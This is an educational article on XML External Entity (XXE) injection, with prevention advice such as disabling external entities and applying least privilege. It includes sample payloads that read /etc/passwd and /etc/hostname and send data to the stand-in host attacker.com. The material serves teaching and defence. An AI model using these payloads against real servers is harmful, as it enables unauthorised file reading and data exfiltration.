---
title: XML External Entity (XXE) Injection
draft: false
date: 2025-01-01
tags:
  - owasp
  - xml
  - xxe
  - injection
  - file_inclusion
  - xml_injection
---

XML External Entity (XXE) vulnerabilities happen when an application uses XML input that refers to external things. By changing these external entity declarations, attackers can read local files or start network requests from the server. In very bad cases, they can even control the computer from far away. XXE usually takes advantage of parsing libraries or features in XML processors that automatically get external resources without checking them well enough.

These attacks are very dangerous because XML parsers might automatically expand entities, download remote content, or even look at system files. If an attacker can control or give XML data (like through file uploads or API calls), and the server doesn't set up its XML parser safely, the attacker can use XXE to steal sensitive data or interact with internal services.

A typical XXE attack might include a DOCTYPE declaration that refers to a system file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [\
  <!ENTITY xxe SYSTEM "file:///etc/passwd">\
]>
<root>
  <data>&xxe;</data>
</root>
```

When an unsafe XML parser uses this, it tries to read `/etc/passwd` from the server's file system and then puts its content in the parsed output. The attacker can then access sensitive local files.

Attackers can make an XML parser load an external resource from a remote server that they control:

```xml
<!DOCTYPE foo [\
  <!ENTITY xxe SYSTEM "http://attacker.com/secret?file=/etc/passwd">\
]>
<root>
  <data>&xxe;</data>
</root>
```

Even if the application's response doesn't directly return the file contents, the attacker's server receives a request that reveals information (like which files exist or open ports) or steals data, depending on how the parser works.

Some XML parsers allow special entities in the DTD, which can be used to sneak in harmful payloads or access environment variables:

```xml
<!DOCTYPE root [\
  <!ENTITY % file SYSTEM "file:///etc/hostname">\
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?host=%file;'>">\
  %eval;\
]>
<root>&exfil;</root>
```

This sequence can start network requests that contain sensitive server data to an external URL.

Here are some ways to prevent XXE attacks:

1. **Disable External Entity Resolution**
- Set up the XML parser to not allow or ignore external entities.
- For example, in Java, disable DTDs and set `XMLConstants.FEATURE_SECURE_PROCESSING` to true.
- Each language or parser usually has settings or flags to turn off external entity expansion.
1. **Use Less Complex Data Formats**
- If possible, don't use XML and its complex features.
- Consider using JSON or other formats that don't include entity expansion by default, which reduces the risk of attack.
1. **Implement Whitelisting and Validation**
- If external entities are really needed, make a list of allowed resources or schemas.
- Check XML input against a safe schema that doesn't allow external references.
1. **Enforce Least Privilege and Sandboxing**
- Run the application with the fewest file system and network permissions possible, so that even if XXE is tried, it has limited access to files or internal endpoints.
- Use containerization or chroot environments to limit the application's view of the file system.
